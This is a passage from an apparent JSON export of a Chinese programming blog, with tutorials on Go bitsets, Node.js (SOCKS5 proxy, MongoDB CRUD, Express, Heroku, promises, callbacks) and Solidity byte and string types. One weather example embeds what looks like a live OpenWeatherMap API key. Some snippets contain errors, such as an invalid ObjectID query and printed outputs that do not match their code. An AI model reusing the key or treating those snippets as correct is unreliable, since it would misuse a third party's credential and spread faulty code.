&quot;00100010&quot;, the set &#123;1, 5&#125;fmt.Printf(&quot;%08b\\n&quot;, y) // &quot;00000110&quot;, the set &#123;1, 2&#125;fmt.Printf(&quot;%08b\\n&quot;, x&amp;y) // &quot;00000010&quot;, the intersection &#123;1&#125;fmt.Printf(&quot;%08b\\n&quot;, x|y) // &quot;00100110&quot;, the union &#123;1, 2, 5&#125;fmt.Printf(&quot;%08b\\n&quot;, x^y) // &quot;00100100&quot;, the symmetric difference &#123;2, 5&#125;fmt.Printf(&quot;%08b\\n&quot;, x&amp;^y) // &quot;00100000&quot;, the difference &#123;5&#125;for i := uint(0); i &lt; 8; i++ &#123; if x&amp;(1&lt;&lt;i) != 0 &#123; // membership test fmt.Println(i) // &quot;1&quot;, &quot;5&quot; &#125;&#125;fmt.Printf(&quot;%08b\\n&quot;, x&lt;&lt;1) // &quot;01000100&quot;, the set &#123;2, 6&#125;fmt.Printf(&quot;%08b\\n&quot;, x&gt;&gt;1) // &quot;00010001&quot;, the set &#123;0, 4&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"node-http-socket5","slug":"node-http-socket5","date":"2018-11-16T15:50:42.000Z","updated":"2018-11-16T15:55:24.348Z","comments":true,"path":"2018/11/16/node-http-socket5/","link":"","permalink":"https://dreamerjonson.com/2018/11/16/node-http-socket5/","excerpt":"","text":"request moudle 使用socket5 代理访问https网页 12345678910111213141516const request = require('request');var Agent = require('socks5-https-client/lib/Agent');request(&#123; url: 'https://google.com/', strictSSL: true, agentClass: Agent, agentOptions: &#123; socksHost: 'localhost', // Defaults to 'localhost'. socksPort: 1086, // Defaults to 1080. &#125;&#125;, function(err, res) &#123; console.log(err || res.body);&#125;); 参考资料； SOCKS5 HTTPS Client Add Socks Proxy support","categories":[{"name":"server","slug":"server","permalink":"https://dreamerjonson.com/categories/server/"}],"tags":[{"name":"server","slug":"server","permalink":"https://dreamerjonson.com/tags/server/"}]},{"title":"nodejs渐入佳境[18]-mongodb-node增删查改","slug":"node-18-mongodb-node","date":"2018-11-16T10:45:56.000Z","updated":"2018-11-29T03:12:26.737Z","comments":true,"path":"2018/11/16/node-18-mongodb-node/","link":"","permalink":"https://dreamerjonson.com/2018/11/16/node-18-mongodb-node/","excerpt":"","text":"1&gt; npm install --save mongodb 12345678910111213141516171819202122232425//mongodb 3以上写法const MongoClient = require('mongodb').MongoClient;//TodoApp是一个数据库名字，mongo中不需要创建数据库MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=&gt;&#123; if(err)&#123; return console.log('Unable to connect to MongoDB server'); &#125; console.log('Connect to MongoDB server'); const db = client.db('TodoApp'); //插入数据 db.collection('Todos').insertOne(&#123; text:'Something to do', completed:false &#125;,(err,result)=&gt;&#123; if(err)&#123; return console.log('unable to insert todo',err); &#125; console.log(JSON.stringify(result.ops,undefined,2)); &#125;);//关闭客户端 client.close();&#125;); id 插入一个对象的时候，会自动的产生一个随机的id。id包含了时间戳和机器识别码。 我们可以借助与mongo的方法，为我们产生一个随机数。 12345const &#123;MongoClient,ObjectID&#125; = require('mongodb');var obj = new ObjectID();console.log(obj);//返回时间console.log(obj.getTimestamp()); 参考资料： MongoDB Node.js Driver Documentation node-mongodb-native 查询 原始数据： 123456789101112[ &#123; &quot;_id&quot;: &quot;5bee9e3794c5f22eb989f6eb&quot;, &quot;text&quot;: &quot;Something to do&quot;, &quot;completed&quot;: false &#125;, &#123; &quot;_id&quot;: &quot;5beeaf0a2d48eb2b7c90758f&quot;, &quot;text&quot;: &quot;Something to do&quot;, &quot;completed&quot;: true &#125;] js代码： 12345678910111213141516171819const &#123;MongoClient,ObjectID&#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=&gt;&#123; if(err)&#123; return console.log('Unable to connect to MongoDB server'); &#125; console.log('Connect to MongoDB server'); const db = client.db('TodoApp'); //返回所有document db.collection('Todos').find().toArray().then((docs)=&gt;&#123; console.log('Todos'); console.log(JSON.stringify(docs,undefined,2)); &#125;,(err)=&gt;&#123; console.log('unable to fetch todos', err); &#125;) client.close();&#125;); 执行代码返回： 123456789101112[ &#123; &quot;_id&quot;: &quot;5bee9e3794c5f22eb989f6eb&quot;, &quot;text&quot;: &quot;Something to do&quot;, &quot;completed&quot;: false &#125;, &#123; &quot;_id&quot;: &quot;5beeaf0a2d48eb2b7c90758f&quot;, &quot;text&quot;: &quot;Something to do&quot;, &quot;completed&quot;: true &#125;] 筛选 123456789101112131415161718const &#123;MongoClient,ObjectID&#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=&gt;&#123; if(err)&#123; return console.log('Unable to connect to MongoDB server'); &#125; console.log('Connect to MongoDB server'); const db = client.db('TodoApp'); db.collection('Todos').find(&#123;completed:true&#125;).toArray().then((docs)=&gt;&#123; console.log('Todos'); console.log(JSON.stringify(docs,undefined,2)); &#125;,(err)=&gt;&#123; console.log('unable to fetch todos', err); &#125;) client.close();&#125;); 执行代码返回： 1234567[ &#123; &quot;_id&quot;: &quot;5beeaf0a2d48eb2b7c90758f&quot;, &quot;text&quot;: &quot;Something to do&quot;, &quot;completed&quot;: true &#125;] 筛选id 1234567891011121314151617181920const &#123;MongoClient,ObjectID&#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=&gt;&#123; if(err)&#123; return console.log('Unable to connect to MongoDB server'); &#125; console.log('Connect to MongoDB server'); const db = client.db('TodoApp'); db.collection('Todos').find(&#123; new ObjectID('5beeaf0a2d48eb2b7c90758f') &#125;).toArray().then((docs)=&gt;&#123; console.log('Todos'); console.log(JSON.stringify(docs,undefined,2)); &#125;,(err)=&gt;&#123; console.log('unable to fetch todos', err); &#125;) client.close();&#125;); 执行代码返回： 1234567[ &#123; &quot;_id&quot;: &quot;5beeaf0a2d48eb2b7c90758f&quot;, &quot;text&quot;: &quot;Something to do&quot;, &quot;completed&quot;: true &#125;] 删除document 1234567891011121314151617181920212223const &#123;MongoClient,ObjectID&#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=&gt;&#123; if(err)&#123; return console.log('Unable to connect to MongoDB server'); &#125; console.log('Connect to MongoDB server'); const db = client.db('TodoApp');// db.collection('Todos').deleteMany(&#123;text:'mike'&#125;); 删除全部//删除一个 // db.collection('Todos').deleteOne(&#123;text:'mike'&#125;).then((result)=&gt;&#123; // console.log(result); // &#125;);//删除并返回对象 db.collection('Todos').findOneAndDelete(&#123;text:'mike'&#125;).then((result)=&gt;&#123; console.log(result); &#125;); client.close();&#125;); 更新 12345678910111213141516171819202122const &#123;MongoClient,ObjectID&#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/TodoApp',(err,client)=&gt;&#123; if(err)&#123; return console.log('Unable to connect to MongoDB server'); &#125; console.log('Connect to MongoDB server'); const db = client.db('TodoApp');//查找并更新 db.collection('Todos').findOneAndUpdate(&#123;text:'mike'&#125;,&#123; $set:&#123; completed:false //设置更改 &#125; &#125;,&#123; returnOriginal:false //返回的结果为更新后的值。 &#125;).then((result)=&gt;&#123; console.log(result); //打印跟新结果 &#125;); client.close();&#125;);","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[17]-mongodb数据库入门","slug":"node-17-mongodb","date":"2018-11-16T07:09:50.000Z","updated":"2018-11-29T03:12:34.773Z","comments":true,"path":"2018/11/16/node-17-mongodb/","link":"","permalink":"https://dreamerjonson.com/2018/11/16/node-17-mongodb/","excerpt":"","text":"下载mongodb https://www.mongodb.com mongod 解压，进入bin目录 12//-dbpath代表数据放置在哪里./mongod -dbpath /Users/jackson/Downloads/mongodb-data waiting for connections on port 27017 新开窗口，测试测试 123456&gt; ./mongo&gt; db.Todos.insert(&#123;text:&apos;Film new node course&apos;&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; db.Todos.find()&#123; &quot;_id&quot; : ObjectId(&quot;5bee6fc6ae6967bacc3d709b&quot;), &quot;text&quot; : &quot;Film new node course&quot; &#125; 可视化 下载： https://studio3t.com/download-now/","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[16]-node express项目部署到heroku","slug":"node-16-heroku-deploy","date":"2018-11-16T06:01:58.000Z","updated":"2018-11-29T03:12:11.312Z","comments":true,"path":"2018/11/16/node-16-heroku-deploy/","link":"","permalink":"https://dreamerjonson.com/2018/11/16/node-16-heroku-deploy/","excerpt":"","text":"源文件 views/partials/footer.hbs: 123&lt;Header&gt; &lt;footer&gt;&#123;&#123;pageTitle&#125;&#125;&lt;/footer&gt;&lt;Header&gt; views/about.hbs: 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Some Website&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&#123;&#123;pageTitle&#125;&#125;&lt;/h1&gt; &lt;p&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=\"/about\"&gt;About&lt;/a&gt;&lt;/p&gt; &lt;p&gt;Some text here&lt;/p&gt; &#123;&#123;&gt; footer&#125;&#125; &lt;/body&gt;&lt;/html&gt;sx express.js: 1234567891011121314151617181920212223242526272829303132const express = require('express');const hbs = require('hbs');const fs = require('fs');var app = express();const port = process.env.PORT || 3000;hbs.registerPartials(__dirname + '/views/partials');app.set('view engine','hbs');// 参数是一个middlewareapp.use(express.static(__dirname +'/public'));//返回html格式app.get('/',(req,res)=&gt;&#123; res.send('&lt;h1&gt;Hello world&lt;/h1&gt;');&#125;);//返回json格式app.get('/fast',(req,res)=&gt;&#123; res.send('&lt;h1&gt;Hello world&lt;/h1&gt;');&#125;);//返回文件，about.hbs在views文件夹下app.get('/about',(req,res)=&gt;&#123; res.render('about.hbs',&#123; pageTitle:'About Page', currentYear:new Date().getFullYear() &#125;);&#125;);//监听端口, 第二个回调是开启服务器后调用app.listen(port,()=&gt;&#123; console.log('hello jonson');&#125;); git 1234.gitignore里面的文件不会提交git initgit add .git commit -m &quot;fitst commit&quot; heroku 安装heroku-cli 略… 1234heroku login // 登陆账号密码hexoru create //创建分支git push heroku master //提交到heroku管理的远程分支hexoru open /打开网址 参考： heroku部署 heroku监控台","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[15]-express框架","slug":"node-15-express","date":"2018-11-15T06:54:02.000Z","updated":"2018-11-29T03:11:37.907Z","comments":true,"path":"2018/11/15/node-15-express/","link":"","permalink":"https://dreamerjonson.com/2018/11/15/node-15-express/","excerpt":"","text":"最简单的服务器 12345678910111213141516171819202122const express = require('express');var app = express();//返回html格式app.get('/',(req,res)=&gt;&#123; res.send('&lt;h1&gt;Hello world&lt;/h1&gt;');&#125;);//返回json格式app.get('/fast',(req,res)=&gt;&#123; res.send(&#123; name:'json', likes:[ 'reading', 'coding' ] &#125;);&#125;);//监听端口app.listen(3000); 访问： localhost:3000 localhost:3000/fast 访问静态文件 创建public/help.html 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" dir=\"ltr\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello Jonson&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; express.js: 12345678910111213141516171819202122232425const express = require('express');var app = express();// 参数是一个middlewareapp.use(express.static(__dirname +'/public'));//返回html格式app.get('/',(req,res)=&gt;&#123; res.send('&lt;h1&gt;Hello world&lt;/h1&gt;');&#125;);//返回json格式app.get('/fast',(req,res)=&gt;&#123; res.send(&#123; name:'json', likes:[ 'reading', 'coding' ] &#125;);&#125;);//监听端口, 第二个回调是开启服务器后调用app.listen(3000,()=&gt;&#123; console.log('hello jonson');&#125;); 访问： http://localhost:3000/help.html 会打开public/help.html的页面并显示出来。 动态注入 express template engines 1npm install --save hbs 新建views/about.hbs: 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&#123;&#123;currentYear&#125;&#125;&lt;/h1&gt; &lt;footer&gt;&#123;&#123;pageTitle&#125;&#125;&lt;/footer&gt; &lt;/body&gt;&lt;/html&gt; express.js: 1234567891011121314151617181920212223242526272829303132333435363738const express = require('express');const hbs = require('hbs');var app = express();app.set('view engine','hbs');// 参数是一个middlewareapp.use(express.static(__dirname +'/public'));//返回html格式app.get('/',(req,res)=&gt;&#123; res.send('&lt;h1&gt;Hello world&lt;/h1&gt;');&#125;);//返回json格式app.get('/fast',(req,res)=&gt;&#123; res.send(&#123; name:'json', likes:[ 'reading', 'coding' ] &#125;);&#125;);//动态传递参数。app.get('/about',(req,res)=&gt;&#123; res.render('about.hbs',&#123; pageTitle:'About Page', currentYear:new Date().getFullYear() &#125;);&#125;);//监听端口, 第二个回调是开启服务器后调用app.listen(3000,()=&gt;&#123; console.log('hello jonson');&#125;); 访问： localhost/about 模版封装 新建：views/partial/footer.hbs: 123&lt;Header&gt; &lt;footer&gt;&#123;&#123;pageTitle&#125;&#125;&lt;/footer&gt;&lt;Header&gt; view/abut.hbs: 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" dir=\"ltr\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&#123;&#123;currentYear&#125;&#125;&lt;/h1&gt; &#123;&#123;&gt; footer&#125;&#125; &lt;/body&gt;&lt;/html&gt; express.js: 123456789101112131415161718192021const express = require('express');const hbs = require('hbs');var app = express();hbs.registerPartials(__dirname + '/views/partials');app.set('view engine','hbs');// 参数是一个middlewareapp.use(express.static(__dirname +'/public'));//返回json格式app.get('/about',(req,res)=&gt;&#123; res.render('about.hbs',&#123; pageTitle:'About Page', currentYear:new Date().getFullYear() &#125;);&#125;);//监听端口, 第二个回调是开启服务器后调用app.listen(3000,()=&gt;&#123; console.log('hello jonson');&#125;); 访问： localhost/about express middleware 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const express = require('express');const hbs = require('hbs');const fs = require('fs');var app = express();hbs.registerPartials(__dirname + '/views/partials');app.set('view engine','hbs');// 参数是一个middlewareapp.use(express.static(__dirname +'/public'));//返回html格式app.get('/',(req,res)=&gt;&#123; res.send('&lt;h1&gt;Hello world&lt;/h1&gt;');&#125;);//自定义middlewareapp.use((req,res,next)=&gt;&#123; var now = new Date().toString(); var log = `$&#123;now&#125;:$&#123;req.method&#125; $&#123;req.url&#125;`; console.log(log); fs.appendFile('server.log',log+'\\n',(err)=&gt;&#123;&#125;); next();&#125;);//返回json格式app.get('/fast',(req,res)=&gt;&#123; res.send(&#123; name:'json', likes:[ 'reading', 'coding' ] &#125;);&#125;);//返回文件，about.hbs在views文件夹下app.get('/about',(req,res)=&gt;&#123; res.render('about.hbs',&#123; pageTitle:'About Page', currentYear:new Date().getFullYear() &#125;);&#125;);//监听端口, 第二个回调是开启服务器后调用app.listen(3000,()=&gt;&#123; console.log('hello jonson');&#125;);","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[14]-promise对象处理异步","slug":"node-14-promise","date":"2018-11-15T04:30:50.000Z","updated":"2018-11-29T03:11:29.212Z","comments":true,"path":"2018/11/15/node-14-promise/","link":"","permalink":"https://dreamerjonson.com/2018/11/15/node-14-promise/","excerpt":"","text":"Promise promise是nodejs的对象，用于处理异步的同步操作。 new Promsie新建一个promise对象，两个参数(resolve,reject)是两个函数。 当调用resolve意味着操作成功。 当调用reject意味着操作失败。 resolve和reject都只会执行一次。 then 函数会在promise执行完毕之后调用。 第一个参数回调函数会在resolve成功后调用，第二个回调函数会在reject触发后调用。 resolve操作成功 123456789101112var somePromise = new Promise((resolve,reject)=&gt;&#123; setTimeout(()=&gt;&#123; resolve('hey it works'); &#125;,2500);&#125;);somePromise.then((message)=&gt;&#123; console.log('Success',message);&#125;,(errorMessage)=&gt;&#123; console.log('Error:',errorMessage);&#125;); 打印出hey it works reject操作失败 123456789101112var somePromise = new Promise((resolve,reject)=&gt;&#123; setTimeout(()=&gt;&#123; reject('ai it is error'); &#125;,2500);&#125;);somePromise.then((message)=&gt;&#123; console.log('Success',message);&#125;,(errorMessage)=&gt;&#123; console.log('Error:',errorMessage);&#125;); 打印出Error: ai it is error 复杂promise 带参数并且多重then函数。 12345678910111213141516171819202122var asyncAdd = (a,b)=&gt;&#123; return new Promise((resolve,reject)=&gt;&#123; setTimeout(()=&gt;&#123; if(typeof a==='number' &amp;&amp; typeof b==='number')&#123; resolve(a+b); &#125;else&#123; reject('Argument must be number'); &#125; &#125;); &#125;);&#125;;asyncAdd(5,7).then((res)=&gt;&#123; console.log('Result',res); return asyncAdd(res,'33');&#125;,(errorMessage)=&gt;&#123; console.log(errorMessage);&#125;).then((res)=&gt;&#123; console.log('should be 45',res);&#125;,(errorMessage)=&gt;&#123; console.log(errorMessage);&#125;); 执行结果： 123Result 12Argument must be numberError: ai it is error 多重then特性 在asyncAdd(5,‘7’)函数reject失败后，第二个then仍然调用的是第一个回调函数。 12345678910111213141516171819202122var asyncAdd = (a,b)=&gt;&#123; return new Promise((resolve,reject)=&gt;&#123; setTimeout(()=&gt;&#123; if(typeof a==='number' &amp;&amp; typeof b==='number')&#123; resolve(a+b); &#125;else&#123; reject('Argument must be number'); &#125; &#125;); &#125;);&#125;;asyncAdd(5,'7').then((res)=&gt;&#123; console.log('Result',res); return asyncAdd(res,'33');&#125;,(errorMessage)=&gt;&#123; console.log(errorMessage);&#125;).then((res)=&gt;&#123; console.log('should be 45',res);&#125;,(errorMessage)=&gt;&#123; console.log(errorMessage);&#125;); 结果为： 123Argument must be numbershould be 45 undefinedError: ai it is error","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[13]-node回调操作","slug":"node-13","date":"2018-11-15T02:37:20.000Z","updated":"2018-11-29T03:11:14.692Z","comments":true,"path":"2018/11/15/node-13/","link":"","permalink":"https://dreamerjonson.com/2018/11/15/node-13/","excerpt":"","text":"自定义回调函数 123456789101112131415//自定义函数，包含回调函数var getUser=(id,callback)=&gt;&#123; var user = &#123; id:id, name:'jonson' &#125; setTimeout(()=&gt;&#123; callback(user); &#125;,3000);&#125;//调用，并且传递了一个回调函数getUser(31,(userobject)=&gt;&#123; console.log(userobject);&#125;) 执行后输出： 1&#123; id: 31, name: &apos;jonson&apos; &#125; 天气网站回调 1&gt; npm install --save request 12345678const request = require('request');request(&#123; url:'https://api.openweathermap.org/data/2.5/forecast?q=beijing,cn&amp;appid=09ec05ac89602c9970393fe760db2bf5', json:true // 将json返回结果解析为json对象&#125;,(error,response,body)=&gt;&#123; console.log(body);&#125;); 打印出： 12345678910111213141516171819202122&#123; cod: &apos;200&apos;, message: 0.0038, cnt: 38, list: [ &#123; dt: 1542261600, main: [Object], weather: [Array], clouds: [Object], wind: [Object], rain: [Object], sys: [Object], dt_txt: &apos;2018-11-15 06:00:00&apos; &#125;, &#123; dt: 1542272400, main: [Object], weather: [Array], clouds: [Object], wind: [Object], rain: [Object], sys: [Object], dt_txt: &apos;2018-11-15 09:00:00&apos; &#125;, ... 好看的格式显示 123456789const request = require('request');request(&#123; url:'https://api.openweathermap.org/data/2.5/forecast?q=beijing,cn&amp;appid=09ec05ac89602c9970393fe760db2bf5', json:true // 将返回结果解析为json对象&#125;,(error,response,body)=&gt;&#123; console.log(JSON.stringify(body,undefined,2));&#125;); 打印出： 12345678910111213141516171819202122232425262728293031323334353637383940&#123; &quot;cod&quot;: &quot;200&quot;, &quot;message&quot;: 0.0026, &quot;cnt&quot;: 38, &quot;list&quot;: [ &#123; &quot;dt&quot;: 1542261600, &quot;main&quot;: &#123; &quot;temp&quot;: 282.38, &quot;temp_min&quot;: 277.973, &quot;temp_max&quot;: 282.38, &quot;pressure&quot;: 1017.9, &quot;sea_level&quot;: 1043.48, &quot;grnd_level&quot;: 1017.9, &quot;humidity&quot;: 90, &quot;temp_kf&quot;: 4.4 &#125;, &quot;weather&quot;: [ &#123; &quot;id&quot;: 500, &quot;main&quot;: &quot;Rain&quot;, &quot;description&quot;: &quot;light rain&quot;, &quot;icon&quot;: &quot;10d&quot; &#125; ], &quot;clouds&quot;: &#123; &quot;all&quot;: 92 &#125;, &quot;wind&quot;: &#123; &quot;speed&quot;: 1.71, &quot;deg&quot;: 330.5 &#125;, &quot;rain&quot;: &#123; &quot;3h&quot;: 0.98 &#125;, &quot;sys&quot;: &#123; &quot;pod&quot;: &quot;d&quot; &#125;, &quot;dt_txt&quot;: &quot;2018-11-15 06:00:00&quot; &#125;, 处理用户输入： 12345678910111213141516171819202122const request = require('request');const yargs = require('yargs');const argv = yargs.options(&#123; a:&#123; demand:true, alias:'address', describe:'Address to fetch weather for', string:true &#125;&#125;).help().alias('help','h').argv;request(&#123; url:`https://samples.openweathermap.org/data/2.5/forecast?q=$&#123;argv.address&#125;,cn&amp;appid=b6907d289e10d714a6e88b30761fae22`, json:true // 将返回结果解析为json对象&#125;,(error,response,body)=&gt;&#123; console.log(JSON.stringify(body,undefined,2));&#125;); 测试 1&gt; node async.js -a xingjiang","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[12]-node异步操作","slug":"node-12","date":"2018-11-15T02:27:48.000Z","updated":"2018-11-29T03:11:02.502Z","comments":true,"path":"2018/11/15/node-12/","link":"","permalink":"https://dreamerjonson.com/2018/11/15/node-12/","excerpt":"","text":"如下异步代码： 12345678910111213console.log('start...');setTimeout(()=&gt;&#123; console.log('first callback');&#125;,2000)setTimeout(()=&gt;&#123; console.log('second callback');&#125;,0)console.log('end...'); 打印结果为： 1234start...end...second callbackfirst callback 总结： 首先执行了下面console.log(‘end…’);，再执行了settimeout的回调函数，即便是settimeout中的时间为0. 原因是nodejs的事件循环机制,出现了异步的效果。 参考：深度理解nodejs[2]-事件循环","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"solidity智能合约[11]-字符串","slug":"solidity-11","date":"2018-11-14T16:44:53.000Z","updated":"2018-11-20T16:37:35.067Z","comments":true,"path":"2018/11/15/solidity-11/","link":"","permalink":"https://dreamerjonson.com/2018/11/15/solidity-11/","excerpt":"","text":"字符串 string 类型存储字符串， 在solidity中使用了UTF-8格式来存储字符串。 123string public name=&quot;jonson&quot;;//6a6f6e736f6estring public name1=&quot;!@#$%^&amp;*())*&quot;;string public name2=&quot;我爱你&quot;; 字符串不能直接的获取长度和内容 下面是错误的方式 1234567// function getLength() returns(uint)&#123; // name.length; // &#125; // function getName() returns(bytes1) &#123; // return name[0]; // &#125; 获取字符串长度和内容和的正确方式 1234567 function getLength() public view returns(uint)&#123; return bytes(name).length;&#125;function getName() public view returns(bytes1)&#123;return bytes(name)[1];&#125; 修改字符串中的内容 1234function changeName() public&#123;// bytes(name)[0]=0x55; bytes(name)[0]=&apos;P&apos;;&#125; 证明中文占了3个字节 1234 string public name2=&quot;我爱你&quot;; function getLength2() public view returns(uint)&#123; return bytes(name2).length;&#125; 字符串转动态字节数组 1234function getBytes() public view returns(bytes)&#123; return bytes(name);&#125; 完整代码测试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.23;contract StringTest&#123; string public name=\"jonson\";//6a6f6e736f6e string public name1=\"!@#$%^&amp;*())*\"; string public name2=\"我爱你\"; // function getLength() returns(uint)&#123; // name.length; // &#125; function getLength() public view returns(uint)&#123; return bytes(name).length; &#125; // function getName() returns(bytes1) &#123; // return name[0]; // &#125; function getName() public view returns(bytes1)&#123; return bytes(name)[1]; &#125; function changeName() public&#123; // bytes(name)[0]=0x55; bytes(name)[0]='P'; &#125; function getBytes() public view returns(bytes)&#123; return bytes(name); &#125; function getLength1() public view returns(uint)&#123; return bytes(name1).length; &#125; function getBytes1() public view returns(bytes)&#123; return bytes(name1); &#125; function getLength2() public view returns(uint)&#123; return bytes(name2).length; &#125; function getBytes2() public view returns(bytes)&#123; return bytes(name2); &#125;&#125; 总结 1、字符串是特殊的动态长度字节数组 2、字符串不能够字节的修改长度和内容，需要转换为bytes动态字节数组 3、字符串在solidity中使用了UTF8格式来存储，所以汉字占了3个字节，英文和特殊字符占了一个字节","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[10]-动态字节数组","slug":"solidity-10","date":"2018-11-14T15:13:14.000Z","updated":"2018-11-20T16:37:39.224Z","comments":true,"path":"2018/11/14/solidity-10/","link":"","permalink":"https://dreamerjonson.com/2018/11/14/solidity-10/","excerpt":"","text":"动态字节数组的定义 bytes 变量名 = new bytes(大小); 动态字节数组的属性 可以修改大小和长度 动态字节数组默认初始化为0 bytes public name = new bytes(2); name的值一开始为0x0000 动态字节数组的赋值 1234function InitName() public&#123; name[0] = 0x6a; name[1] =0x6f; &#125; 动态字节数组的属性 123function getLength() view public returns(uint)&#123; return name.length; &#125; 动态字节数组修改长度和添加变量 123456789function changeLength() public&#123; name.length = 5;&#125;//添加到后方function pushBytes() public&#123; name.push(0x99);&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[9]-字节数组与运算","slug":"solidity-9","date":"2018-11-14T14:50:39.000Z","updated":"2018-11-20T16:37:42.418Z","comments":true,"path":"2018/11/14/solidity-9/","link":"","permalink":"https://dreamerjonson.com/2018/11/14/solidity-9/","excerpt":"","text":"byte类型 有byte bytes1 bytes2 … bytes32 特殊的有byte == bytes1 后面的数字代表占了多少字节。1个字节在内存中占了8位 性质 固定字节数组不能修改长度和内容 字节一般用16进制来存储 16进制中的1个数字代表占了4位。 1234567bytes1 public num1 = 0x6a; //转换为10进制：106bytes2 public num2 = 0x6a6f; //转换为10进制：27247bytes6 public num3 = 0x6a6f6e736f6e; bytes1 public a = 0x6a;//转换为2进制：0110 1010 bytes1 public b = 0x6f;//转换为2进制：0110 1111 字节可以有长度属性 123function getlength() view public returns(uint,uint,uint)&#123; return (num1.length,num2.length,num3.length);&#125; 字节可以比较大小 不同类型的字节也可以比较大小 1234567891011121314151617181920212223242526function test1() public view returns(bool)&#123; return a&gt;b;&#125; function test2() public view returns(bool)&#123; return a&gt;=b;&#125; function test3() public view returns(bool)&#123; return a&lt;b;&#125; function test4() public view returns(bool)&#123; return a&lt;=b;&#125;function test5() public view returns(bool)&#123; return a==b;&#125; function test6() public view returns(bool)&#123; return a!=b;&#125; function test7() public view returns(bool)&#123; return num2 &gt;num1;&#125; 字节可以进行位运算 12345678910111213141516171819202122232425262728// 0110 1010// 0110 1111//&amp;0110 1010 106 0x6a//|0110 1111 111 0x6f//^0000 0101 5 0x05//~1001 0101 149 0x95//&lt;1101 0100 212 0xd4//&gt;0011 0101 53 0x35 function weiTest1() public view returns(bytes1)&#123; return a &amp; b;&#125; function weiTest2() public view returns(bytes1)&#123; return a | b;&#125; function weiTest3() public view returns(bytes1)&#123; return a ^ b;&#125; function weiTest4() public view returns(bytes1)&#123; return ~a;&#125; function weiTest5() public view returns(bytes1)&#123; return a&lt;&lt;1; &#125; function weiTest6() public view returns(bytes1)&#123; return a &gt;&gt;1;&#125; 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081pragma solidity ^0.4.23;contract bytesTest&#123; //0x6a6f6e736f6e bytes1 public num1 = 0x6a; //106 bytes2 public num2 = 0x6a6f; //27247 bytes6 public num3 = 0x6a6f6e736f6e; bytes1 public a = 